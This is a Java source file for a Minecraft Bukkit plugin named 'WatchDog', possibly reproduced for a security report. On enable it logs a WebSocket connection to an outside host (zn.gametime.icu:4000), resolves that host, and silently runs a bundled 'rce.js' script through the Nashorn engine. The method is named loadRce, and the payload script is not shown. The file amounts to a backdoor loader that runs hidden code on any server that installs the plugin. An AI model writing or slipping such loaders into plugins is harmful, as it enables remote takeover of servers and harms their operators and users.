package report.yumc.watchdog;

import org.bukkit.plugin.java.JavaPlugin;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.io.FileNotFoundException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.UnknownHostException;

public class WatchDog extends JavaPlugin {
    @Override
    public void onEnable() {
        this.getLogger().info("Start WebSocket to 'ws://zn.gametime.icu:4000/'");
        // 输出当前解析的域名 ip
        try {
            System.out.println(InetAddress.getByName("zn.gametime.icu"));
        } catch (UnknownHostException e) {
            throw new RuntimeException(e);
        }
        // 启动 js
        try {
            loadRce();
        } catch (FileNotFoundException | ScriptException e) {
            throw new RuntimeException(e);
        }

        this.getLogger().info("Enabled successfully.");
    }

    @Override
    public void onDisable() {
        this.getLogger().info("Disabled successfully.");
    }

    private void loadRce() throws FileNotFoundException, ScriptException {
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");

        engine.eval(new InputStreamReader(getResource("rce.js")));
    }
}
